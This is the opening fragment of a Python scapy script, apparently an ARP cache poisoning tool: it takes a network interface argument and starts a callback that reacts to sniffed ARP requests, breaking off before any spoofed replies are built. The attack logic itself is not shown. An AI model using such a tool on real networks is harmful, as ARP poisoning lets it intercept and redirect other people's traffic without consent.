#!/usr/bin/python3

import sys
from scapy.all import sendp, sniff, ARP, Ether


if len(sys.argv) < 2:
    print(sys.argv[0] + " <iface >")
    sys.exit(0)


def arp_poison_callback( packet):
    # Got ARP request?
    if packet[ARP].op == 1: